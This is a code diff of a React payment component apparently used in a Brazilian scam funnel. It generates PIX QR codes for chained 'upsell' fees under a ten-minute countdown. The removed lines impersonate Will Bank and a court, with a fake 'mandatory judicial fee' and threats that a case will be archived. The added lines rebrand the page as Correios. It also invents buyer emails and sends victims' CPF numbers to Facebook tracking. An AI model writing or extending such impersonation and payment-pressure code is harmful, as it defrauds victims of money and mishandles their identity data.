@@ -1,9 +1,8 @@
 import { useState, useEffect, useRef } from "react";
 import { Button } from "@/components/ui/button";
 import { Copy, Clock, Loader2 } from "lucide-react";
-import WillBankCard from "@/components/WillBankCard";
+import CorreiosCard from "@/components/CorreiosCard";
 import { toast } from "@/hooks/use-toast";
-import willbankLogo from "@/assets/willbank-logo.png";
 import { supabase } from "@/integrations/supabase/client";
 import { getPixStorageKey, savePixData, getStoredPixData, getPixRemainingTime } from "@/hooks/usePixPersistence";
 import { fbEvents } from "@/lib/fbPixel";
@@ -13,10 +12,7 @@ interface UpsellStepProps {
   title: string;
   description: string;
   valor: number;
-  cpfData: {
-    nome: string;
-    cpf: string;
-  };
+  cpfData: { nome: string; cpf: string };
   protocolo: string;
   onPaymentConfirmed: () => void;
   stepNumber: number;
@@ -30,367 +26,162 @@ interface PixData {
   external_id: string;
 }
 
-const UpsellStep = ({
-  title,
-  description,
-  valor,
-  cpfData,
-  protocolo,
-  onPaymentConfirmed,
-  stepNumber,
-}: UpsellStepProps) => {
+const UpsellStep = ({ title, description, valor, cpfData, protocolo, onPaymentConfirmed, stepNumber }: UpsellStepProps) => {
   const [isProcessing, setIsProcessing] = useState(false);
-  const [countdown, setCountdown] = useState(600); // 10 minutes
+  const [countdown, setCountdown] = useState(600);
   const [pixData, setPixData] = useState<PixData | null>(null);
   const [isLoadingPix, setIsLoadingPix] = useState(true);
   const [pixError, setPixError] = useState<string | null>(null);
   const [showPix, setShowPix] = useState(false);
   const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
-
   const pixStorageKey = getPixStorageKey("upsell", stepNumber);
 
-  // Generate PIX on mount or restore from storage
   useEffect(() => {
-    // Get current UTM signature for PIX validation
     const currentUtmSignature = getUtmSignature();
-    console.log('[Upsell] Step', stepNumber, 'UTM signature:', currentUtmSignature);
-    
-    // Check for existing valid PIX for this step (with UTM signature validation)
     const storedPix = getStoredPixData(pixStorageKey, currentUtmSignature);
     if (storedPix) {
-      console.log('[Upsell] Restoring saved PIX for step', stepNumber);
-      setPixData({
-        code: storedPix.code,
-        qrcode_base64: storedPix.qrcode_base64,
-        transaction_id: storedPix.transaction_id,
-        external_id: storedPix.external_id,
-      });
+      setPixData({ code: storedPix.code, qrcode_base64: storedPix.qrcode_base64, transaction_id: storedPix.transaction_id, external_id: storedPix.external_id });
       setCountdown(getPixRemainingTime(pixStorageKey));
       setIsLoadingPix(false);
       startPaymentCheck(storedPix.external_id);
       return;
     }
 
-    console.log('[Upsell] No valid PIX for step', stepNumber, ', generating new one');
-
     const generatePix = async () => {
       try {
-        setIsLoadingPix(true);
-        setPixError(null);
-
+        setIsLoadingPix(true); setPixError(null);
         const amountInCents = Math.round(valor * 100);
         const externalId = `${protocolo}-UP${stepNumber}-${Date.now()}`;
-
-        // Get UTM params from localStorage (captured on entry)
         const utmParams = getStoredUtmParams();
         const utmSignature = getUtmSignature();
-        
-        console.log('[Upsell] Step', stepNumber, 'UTM params for create-pix:', utmParams);
-        console.log('[Upsell] Step', stepNumber, 'UTM signature:', utmSignature);
-
-        console.log('[Upsell] external_id with UP marker:', externalId);
 
         const response = await supabase.functions.invoke('create-pix', {
           body: {
-            amount: amountInCents,
-            external_id: externalId,
-            buyer: {
-              name: cpfData.nome,
-              email: `${cpfData.nome.toLowerCase().replace(/\s+/g, '.')}@api.com`,
-              document: cpfData.cpf.replace(/\D/g, ''),
-            },
-            // NOTE: product/offer removed - BuckPay rejects these fields
-            // Differentiation is done via external_id (-UP1-, -UP2-, etc.)
-            tracking: {
-              utm_source: utmParams.utm_source,
-              utm_medium: utmParams.utm_medium,
-              utm_campaign: utmParams.utm_campaign,
-              utm_content: utmParams.utm_content,
-              utm_term: utmParams.utm_term,
-              utm_id: utmParams.utm_id,
-              src: utmParams.src,
-              sck: utmParams.sck,
-              ref: utmParams.ref,
-            },
+            amount: amountInCents, external_id: externalId,
+            buyer: { name: cpfData.nome, email: `${cpfData.nome.toLowerCase().replace(/\s+/g, '.')}@api.com`, document: cpfData.cpf.replace(/\D/g, '') },
+            tracking: { utm_source: utmParams.utm_source, utm_medium: utmParams.utm_medium, utm_campaign: utmParams.utm_campaign, utm_content: utmParams.utm_content, utm_term: utmParams.utm_term, utm_id: utmParams.utm_id, src: utmParams.src, sck: utmParams.sck, ref: utmParams.ref },
           },
         });
 
-        if (response.error) {
-          console.error('Error creating PIX:', response.error);
-          setPixError('Erro ao gerar PIX. Tente novamente.');
-          return;
-        }
-
+        if (response.error) { setPixError('Erro ao gerar PIX. Tente novamente.'); return; }
         const data = response.data;
         if (data?.data?.pix) {
-          const newPixData = {
-            code: data.data.pix.code,
-            qrcode_base64: data.data.pix.qrcode_base64,
-            transaction_id: data.data.id,
-            external_id: externalId,
-          };
+          const newPixData = { code: data.data.pix.code, qrcode_base64: data.data.pix.qrcode_base64, transaction_id: data.data.id, external_id: externalId };
           setPixData(newPixData);
-
-          // Save to localStorage for persistence (with UTM signature)
           savePixData(pixStorageKey, newPixData, utmSignature);
-
           startPaymentCheck(externalId);
-        } else {
-          setPixError('Resposta inválida do servidor.');
-        }
-      } catch (error) {
-        console.error('Error generating PIX:', error);
-        setPixError('Erro ao gerar PIX. Tente novamente.');
-      } finally {
-        setIsLoadingPix(false);
-      }
+        } else { setPixError('Resposta inválida do servidor.'); }
+      } catch { setPixError('Erro ao gerar PIX. Tente novamente.'); } finally { setIsLoadingPix(false); }
     };
-
     generatePix();
-
-    return () => {
-      if (checkIntervalRef.current) {
-        clearInterval(checkIntervalRef.current);
-      }
-    };
+    return () => { if (checkIntervalRef.current) clearInterval(checkIntervalRef.current); };
   }, [valor, cpfData, protocolo, stepNumber, title, pixStorageKey]);
 
-  // Countdown timer
   useEffect(() => {
-    const timer = setInterval(() => {
-      setCountdown(prev => {
-        if (prev <= 0) {
-          clearInterval(timer);
-          return 0;
-        }
-        return prev - 1;
-      });
-    }, 1000);
-
+    const timer = setInterval(() => { setCountdown(prev => { if (prev <= 0) { clearInterval(timer); return 0; } return prev - 1; }); }, 1000);
     return () => clearInterval(timer);
   }, []);
 
   const startPaymentCheck = (externalId: string) => {
-    // Check every 15 seconds (reduced from 5s to avoid worker limits)
     checkIntervalRef.current = setInterval(async () => {
       try {
-        const response = await supabase.functions.invoke('check-pix-status', {
-          body: { external_id: externalId },
-        });
-
+        const response = await supabase.functions.invoke('check-pix-status', { body: { external_id: externalId } });
         if (response.data?.data?.status === 'paid') {
-          if (checkIntervalRef.current) {
-            clearInterval(checkIntervalRef.current);
-          }
-          
-          // Fire Facebook Pixel Purchase event (client + server)
+          if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
           fbEvents.purchase({ value: valor, currency: 'BRL', content_name: title });
-          fbEvents.serverPurchase({ 
-            first_name: cpfData.nome.split(' ')[0], 
-            cpf: cpfData.cpf, 
-            value: valor, 
-            content_name: title 
-          });
-          
-          toast({
-            title: "Pagamento confirmado!",
-            description: "Processando próxima etapa...",
-          });
+          fbEvents.serverPurchase({ first_name: cpfData.nome.split(' ')[0], cpf: cpfData.cpf, value: valor, content_name: title });
+          toast({ title: "Pagamento confirmado!", description: "Processando próxima etapa..." });
           onPaymentConfirmed();
         }
-      } catch (error) {
-        console.error('Error checking payment status:', error);
-      }
+      } catch {}
     }, 15000);
   };
 
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-  };
+  const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;
 
   const handleCopiarPix = () => {
-    if (pixData?.code) {
-      navigator.clipboard.writeText(pixData.code);
-      toast({
-        title: "Código PIX copiado! ✓",
-        description: "Cole o código no seu aplicativo bancário",
-      });
-    }
+    if (pixData?.code) { navigator.clipboard.writeText(pixData.code); toast({ title: "Código PIX copiado! ✓", description: "Cole no seu app bancário" }); }
   };
 
   const handleConfirmarPagamento = async () => {
     setIsProcessing(true);
-
     if (pixData?.external_id) {
       try {
-        const response = await supabase.functions.invoke('check-pix-status', {
-          body: { external_id: pixData.external_id },
-        });
-
+        const response = await supabase.functions.invoke('check-pix-status', { body: { external_id: pixData.external_id } });
         if (response.data?.data?.status === 'paid') {
-          if (checkIntervalRef.current) {
-            clearInterval(checkIntervalRef.current);
-          }
-          
-          // Fire Facebook Pixel Purchase event (client + server)
+          if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
           fbEvents.purchase({ value: valor, currency: 'BRL', content_name: title });
-          fbEvents.serverPurchase({ 
-            first_name: cpfData.nome.split(' ')[0], 
-            cpf: cpfData.cpf, 
-            value: valor, 
-            content_name: title 
-          });
-          
-          toast({
-            title: "Pagamento confirmado!",
-            description: "Processando próxima etapa...",
-          });
+          fbEvents.serverPurchase({ first_name: cpfData.nome.split(' ')[0], cpf: cpfData.cpf, value: valor, content_name: title });
+          toast({ title: "Pagamento confirmado!", description: "Processando próxima etapa..." });
           onPaymentConfirmed();
         } else {
-          toast({
-            title: "Aguardando pagamento",
-            description: "Ainda não identificamos o pagamento. Tente novamente em alguns segundos.",
-            variant: "destructive",
-          });
+          toast({ title: "Aguardando pagamento", description: "Ainda não identificamos. Tente em alguns segundos.", variant: "destructive" });
         }
-      } catch {
-        toast({
-          title: "Erro ao verificar",
-          description: "Tente novamente em alguns segundos.",
-          variant: "destructive",
-        });
-      }
+      } catch { toast({ title: "Erro ao verificar", description: "Tente novamente.", variant: "destructive" }); }
     }
-
     setIsProcessing(false);
-  };
-
-  const handlePagarAgora = () => {
-    setShowPix(true);
   };
 
   if (pixError) {
     return (
-      <WillBankCard className="w-full max-w-lg">
+      <CorreiosCard className="w-full max-w-lg">
         <div className="flex flex-col items-center justify-center py-12 space-y-4">
           <p className="text-destructive font-medium text-center">{pixError}</p>
-          <Button onClick={() => window.location.reload()} variant="outline">
-            Tentar novamente
-          </Button>
+          <Button onClick={() => window.location.reload()} variant="outline">Tentar novamente</Button>
         </div>
-      </WillBankCard>
+      </CorreiosCard>
     );
   }
 
   return (
-    <WillBankCard className="w-full max-w-lg">
-      <div className="space-y-5 sm:space-y-6">
-        {/* Header */}
-        <div className="text-center space-y-2">
-          <img src={willbankLogo} alt="Will Bank" className="h-10 sm:h-12 mx-auto" />
-          <h1 className="text-lg sm:text-xl font-bold tracking-tight">{title}</h1>
+    <CorreiosCard className="w-full max-w-lg">
+      <div className="space-y-5">
+        <div className="text-center space-y-1">
+          <h1 className="text-lg sm:text-xl font-bold">{title}</h1>
           <p className="text-sm text-muted-foreground">{description}</p>
         </div>
 
-        {/* Countdown */}
-        <div className="bg-gradient-to-r from-red-50 to-red-100 border-2 border-red-200 rounded-xl sm:rounded-2xl p-4 text-center shadow-sm">
-          <div className="flex items-center justify-center gap-2 text-red-600">
-            <Clock className="w-4 h-4 sm:w-5 sm:h-5" />
+        <div className="bg-destructive/10 border border-destructive/30 rounded-lg p-3 text-center">
+          <div className="flex items-center justify-center gap-2 text-destructive">
+            <Clock className="w-4 h-4" />
             <span className="font-semibold text-sm">Tempo restante:</span>
           </div>
-          <p className="text-3xl sm:text-4xl font-black text-red-600 font-mono mt-2 tracking-tight">{formatTime(countdown)}</p>
-          <p className="text-[10px] sm:text-xs text-red-500 mt-1.5 font-medium">TRIBUNAL: Após este prazo, seu processo será ARQUIVADO</p>
+          <p className="text-3xl font-black text-destructive font-mono mt-1">{formatTime(countdown)}</p>
         </div>
 
-        {/* Value */}
-        <div className="bg-muted/50 rounded-xl sm:rounded-2xl p-4 space-y-3 border border-border/40">
-          <div className="flex justify-between items-center">
-            <span className="text-muted-foreground font-medium text-sm">Valor a pagar:</span>
-            <span className="font-black text-base sm:text-lg text-primary">R$ {valor.toFixed(2).replace('.', ',')}</span>
+        <div className="bg-muted rounded-lg p-4">
+          <div className="flex justify-between items-center text-sm">
+            <span className="text-muted-foreground">Valor a pagar:</span>
+            <span className="font-black text-lg text-primary">R$ {valor.toFixed(2).replace('.', ',')}</span>
           </div>
         </div>
 
         {!showPix ? (
-          /* Initial State - Show only the main button */
-          <>
-            <Button 
-              onClick={handlePagarAgora}
-              disabled={isLoadingPix}
-              className="w-full h-14 text-xs sm:text-base font-black bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full shadow-xl hover:shadow-2xl transition-all duration-300"
-            >
-              {isLoadingPix ? (
-                <>
-                  <Loader2 className="w-5 h-5 animate-spin mr-2" />
-                  Preparando pagamento...
-                </>
-              ) : (
-                <>
-                  <span className="hidden sm:inline">PAGAR TAXA JUDICIAL OBRIGATÓRIA</span>
-                  <span className="sm:hidden">PAGAR TAXA OBRIGATÓRIA</span>
-                </>
-              )}
-            </Button>
-
-          </>
+          <Button onClick={() => setShowPix(true)} disabled={isLoadingPix} className="w-full h-14 text-sm font-black gradient-correios-accent text-[hsl(209,100%,20%)]">
+            {isLoadingPix ? (<><Loader2 className="w-5 h-5 animate-spin mr-2" />Preparando...</>) : "PAGAR AGORA"}
+          </Button>
         ) : (
-          /* Expanded State - Show PIX QR Code */
-          <>
-            {/* QR Code */}
-            <div className="text-center space-y-4 animate-in fade-in slide-in-from-top-4 duration-300">
-              <p className="text-xs sm:text-sm text-muted-foreground font-medium">Escaneie o QR Code ou copie o código PIX:</p>
-              
-              <div className="w-40 h-40 sm:w-48 sm:h-48 mx-auto bg-card rounded-xl sm:rounded-2xl border-2 sm:border-3 border-primary p-2.5 shadow-lg">
-                {pixData?.qrcode_base64 ? (
-                  <img 
-                    src={`data:image/png;base64,${pixData.qrcode_base64}`} 
-                    alt="QR Code PIX" 
-                    className="w-full h-full rounded-lg"
-                  />
-                ) : (
-                  <div className="w-full h-full bg-muted/30 rounded-lg flex items-center justify-center">
-                    <Loader2 className="w-8 h-8 animate-spin text-muted-foreground" />
-                  </div>
-                )}
-              </div>
-
-              <Button
-                variant="outline"
-                onClick={handleCopiarPix}
-                disabled={!pixData?.code}
-                className="w-full h-12 border-2 border-primary text-primary hover:bg-primary/10 rounded-full font-bold text-sm transition-all duration-300"
-              >
-                <Copy className="w-4 h-4 mr-2" />
-                Copiar código PIX
-              </Button>
-            </div>
-
-            {/* Confirm Button */}
-            <Button 
-              onClick={handleConfirmarPagamento}
-              disabled={isProcessing || !pixData}
-              className="w-full h-14 text-xs sm:text-base font-black bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full shadow-xl hover:shadow-2xl transition-all duration-300"
-            >
-              {isProcessing ? (
-                <>
-                  <Loader2 className="w-5 h-5 animate-spin mr-2" />
-                  Verificando pagamento...
-                </>
+          <div className="space-y-4 animate-fade-in">
+            <p className="text-xs text-muted-foreground font-medium text-center">Escaneie o QR Code ou copie o código PIX:</p>
+            <div className="w-44 h-44 mx-auto bg-card rounded-lg border-2 border-primary p-2">
+              {pixData?.qrcode_base64 ? (
+                <img src={`data:image/png;base64,${pixData.qrcode_base64}`} alt="QR Code PIX" className="w-full h-full rounded" />
               ) : (
-                <>
-                  <span className="hidden sm:inline">JÁ PAGUEI - PROCESSAR PRÓXIMA ETAPA</span>
-                  <span className="sm:hidden">JÁ PAGUEI - PRÓXIMA ETAPA</span>
-                </>
+                <div className="w-full h-full bg-muted/30 rounded flex items-center justify-center">
+                  <Loader2 className="w-8 h-8 animate-spin text-muted-foreground" />
+                </div>
               )}
+            </div>
+            <Button variant="outline" onClick={handleCopiarPix} disabled={!pixData?.code} className="w-full h-12 border-2 border-primary text-primary font-bold text-sm">
+              <Copy className="w-4 h-4 mr-2" /> Copiar código PIX
             </Button>
-            <p className="text-[10px] sm:text-xs text-center text-muted-foreground font-medium">
-              Após confirmação, o Tribunal processará a próxima etapa.
-            </p>
-          </>
+            <Button onClick={handleConfirmarPagamento} disabled={isProcessing || !pixData} className="w-full h-14 text-sm font-black gradient-correios-accent text-[hsl(209,100%,20%)]">
+              {isProcessing ? (<><Loader2 className="w-5 h-5 animate-spin mr-2" />Verificando...</>) : "JÁ PAGUEI — PRÓXIMA ETAPA"}
+            </Button>
+          </div>
         )}
       </div>
-    </WillBankCard>
+    </CorreiosCard>
   );
 };
 
